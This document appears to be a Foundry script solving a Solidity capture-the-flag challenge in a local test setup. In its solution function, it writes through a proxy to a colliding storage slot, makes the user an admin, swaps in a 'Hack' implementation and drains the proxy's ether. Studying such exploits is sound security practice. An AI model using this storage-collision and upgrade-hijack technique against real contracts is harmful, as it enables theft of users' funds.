// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Script, console2} from "forge-std/Script.sol";

import {Database} from "../src/Database.sol";
import {Proxy} from "../src/Proxy.sol";
import {Hack} from "../src/Hack.sol";

contract ResolutionScript is Script {
    Database internal implementation;
    Proxy internal proxy;
    address internal user;

    function setUp() public {
        implementation = new Database();
        proxy = new Proxy(address(implementation));
        user = makeAddr("user");
    }

    function run() public {
        vm.deal(user, 100_000 ether);
        Database(address(proxy)).fund{value: 100_000 ether}();

        vm.startPrank(user);
        solution();
        vm.stopPrank();

        require(isSolved(), "Not solved");
    }

    function solution() internal {
        // write your solution here !
        Database(address(proxy)).write(
            uint256(uint160(address(user))),
            bytes32(uint256(uint8(1)))
        );

        proxy.addAdmin(address(user));
        proxy.setImplementation(address(new Hack()));
        Hack(address(proxy)).pwn(payable(user));
    }

    function isSolved() internal view returns (bool) {
        return address(proxy).balance == 0;
    }
}
